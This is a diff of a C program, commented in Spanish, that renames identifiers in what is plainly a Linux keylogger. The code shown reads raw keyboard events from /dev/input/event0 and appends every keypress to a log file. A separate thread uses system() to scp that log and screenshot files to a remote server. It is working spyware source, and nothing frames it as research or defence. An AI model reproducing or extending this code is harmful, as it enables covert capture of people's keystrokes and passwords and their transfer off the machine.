@@ -8,7 +8,7 @@
 #include <time.h>
 
 // Función para obtener la tecla y su valor correspondiente
-const char* get_key_name(int code) {
+const char* get_key(int code) {
     switch(code) {
         case KEY_A: return "a";
         case KEY_B: return "b";
@@ -102,27 +102,27 @@ const char* get_key_name(int code) {
 void* capture_keystrokes(void* arg) {
     struct input_event ev;
     ssize_t n;
-    int fd;
-    FILE *log_file;
+    int f;
+    FILE *logger_file;
 
     // Abre el archivo del teclado
-    fd = open("/dev/input/event0", O_RDONLY);
-    if (fd == -1) {
+    f = open("/dev/input/event0", O_RDONLY);
+    if (f == -1) {
         perror("Error: No se puede abrir el dispositivo de entrada");
         return NULL;
     }
 
     // Abre el archivo para guardar los registros
-    log_file = fopen("keylog.txt", "a");
-    if (log_file == NULL) {
+    logger_file = fopen("keylogger.txt", "a");
+    if (logger_file == NULL) {
         perror("Error: No se puede abrir el archivo de registro");
-        close(fd);
+        close(f);
         return NULL;
     }
 
     // Bucle para leer las pulsaciones de teclas
     while (1) {
-        n = read(fd, &ev, sizeof(ev));
+        n = read(f, &ev, sizeof(ev));
         if (n == (ssize_t)-1) {
             perror("Error al leer del dispositivo");
             break;
@@ -133,17 +133,17 @@ void* capture_keystrokes(void* arg) {
 
         // Filtra solo los eventos de teclas y solo cuando se detecta un pulsación
         if (ev.type == EV_KEY && ev.value == 1) {
-            const char* key_name = get_key_name(ev.code);
+            const char* key_name = get_key(ev.code);
             if (*key_name) {
-                fprintf(log_file, "%s", key_name);
-                fflush(log_file);
+                fprintf(logger_file, "%s", key_name);
+                fflush(logger_file);
             }
         }
     }
 
     // Cierra los archivos abiertos para evitar errores
-    fclose(log_file);
-    close(fd);
+    fclose(logger_file);
+    close(f);
 
     return NULL;
 }
@@ -179,7 +179,7 @@ void* transfer_files(void* arg) {
 
         // Transfiere los archivos al servidor
         char command[200];
-        snprintf(command, sizeof(command), "scp keylog.txt screenshot_*.png user@server:/path/to/destination/");
+        snprintf(command, sizeof(command), "scp keylogger.txt screenshot_*.png user@server:/path/to/destination/");
         
         system(command);
     }
